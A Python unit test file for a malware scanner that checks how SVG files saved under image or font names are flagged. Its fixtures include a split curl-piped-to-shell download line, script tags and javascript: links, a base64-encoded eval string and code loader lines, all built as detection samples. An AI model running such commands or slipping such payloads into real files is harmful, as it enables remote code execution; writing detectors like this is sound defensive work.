#!/usr/bin/env python3
"""An SVG image saved under another image's name is for you to check, not a disguised payload; a file under
an image's name that holds code, a script, a download handed to a shell, or anything outside its SVG, still
is one."""
from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from stayawake.bots.security.matchers import heuristic
from stayawake.bots.security.models import CONFIRMED, HEURISTIC, INFECTED, SUSPICIOUS
from stayawake.bots.security.scanner import scan_target
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.targets import LocalRepoTarget
from stayawake.bots.security.targets.base import ScanOptions
from tests.support import samples

_DISGUISED = "disguised-binary-file"
_SVG_IMAGE = "svg-under-an-image-name"
_OPEN = '<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128" viewBox="0 0 128 128">'
_SHAPES = "".join(f'<rect x="{n}" y="{n}" width="8" height="8" fill="#336699"/>' for n in range(0, 128, 8))
_CLOSE = "</svg>\n"
SVG = _OPEN + _SHAPES + _CLOSE
EXPORTED = ('<?xml version="1.0" encoding="utf-8"?>\n'
            "<!-- Generator: Adobe Illustrator 27.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0) -->\n" + SVG)
DOWNLOAD = samples.joined("cu", "rl -s https://example.invalid/x | sh")
_READ_CAP = getattr(heuristic, "_SVG_CAP", 1_000_000)


def _an_image_that_fills_the_read_and_then_more(after: str) -> str:
    """Build a picture whose first bytes up to one past the cap end at its closing tag, then `after`."""
    head = _OPEN + _SHAPES * (_READ_CAP // 2 // len(_SHAPES)) + "<!--"
    fill = _READ_CAP + 1 - len(head) - len("--></svg>")
    return head + "x" * fill + "--></svg>" + after


def _scan(name: str, content: bytes | str):
    folder = Path(tempfile.mkdtemp())
    path = folder / "assets" / name
    path.parent.mkdir(parents=True)
    path.write_bytes(content.encode() if isinstance(content, str) else content)
    return scan_target(LocalRepoTarget(folder, "p", ScanOptions()), load_signatures(), [])


def _graded(result) -> dict[str, str]:
    return {f.signature_id: f.confidence for f in result.findings if f.signature_id in (_DISGUISED, _SVG_IMAGE)}


class TestAnSvgUnderAnImageNameIsForYouToCheck(unittest.TestCase):
    def test_an_svg_saved_as_a_png_reads_suspicious(self):
        result = _scan("logo.png", SVG)
        self.assertEqual(result.verdict, SUSPICIOUS)
        self.assertEqual(_graded(result), {_SVG_IMAGE: HEURISTIC})

    def test_an_exported_svg_with_its_declaration_and_generator_note_reads_suspicious(self):
        for name in ("logo.png", "logo.jpg"):
            with self.subTest(name=name):
                self.assertEqual(_graded(_scan(name, EXPORTED)), {_SVG_IMAGE: HEURISTIC})


class TestAFileThatHoldsMoreThanAnSvgImageIsStillAPayload(unittest.TestCase):
    def test_each_is_a_disguised_payload(self):
        for label, content in {
            "code": samples.loader_line() * 3,
            "code after the image": SVG + samples.loader_line(),
            "a script": _OPEN + samples.joined("<scr", "ipt>alert(1)</scr", "ipt>") + _SHAPES + _CLOSE,
            "a link that runs code": _OPEN + samples.joined('<a href="java', 'script:alert(1)">x</a>') + _SHAPES + _CLOSE,
            "a leading comment": "<!-- logo -->\n" + SVG,
            "code inside the image": _OPEN + samples.joined("<desc>req", "uire('x')</desc>") + _SHAPES + _CLOSE,
            "too large to read in full": _OPEN + _SHAPES * 1200 + _CLOSE,
            "data after the image": SVG + "ZXZhbChhdG9iKCdhbGVydCgxKScpKQ==\n",
            "code past what is read": _an_image_that_fills_the_read_and_then_more("\n" + samples.loader_line()),
            "text that is not an image": "This file is notes, not a picture.\n" * 12,
        }.items():
            with self.subTest(label=label):
                result = _scan("logo.png", content)
                self.assertEqual(result.verdict, INFECTED)
                self.assertEqual(_graded(result), {_DISGUISED: CONFIRMED})

    def test_a_download_handed_to_a_shell_inside_the_image_is_a_payload(self):
        content = _OPEN + "<text>\n" + DOWNLOAD + "\n</text>" + _SHAPES + _CLOSE
        for name in ("logo.png", "logo.jpg"):
            with self.subTest(name=name):
                self.assertEqual(_graded(_scan(name, content)), {_DISGUISED: CONFIRMED})

    def test_an_svg_under_a_fonts_name_is_a_payload(self):
        result = _scan(samples.joined("icons.wo", "ff2"), SVG)
        self.assertEqual(result.verdict, INFECTED)
        self.assertNotIn(_SVG_IMAGE, {f.signature_id for f in result.findings})

    def test_a_real_png_reads_clean(self):
        png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
        self.assertEqual(_graded(_scan("logo.png", png)), {})


if __name__ == "__main__":
    unittest.main()
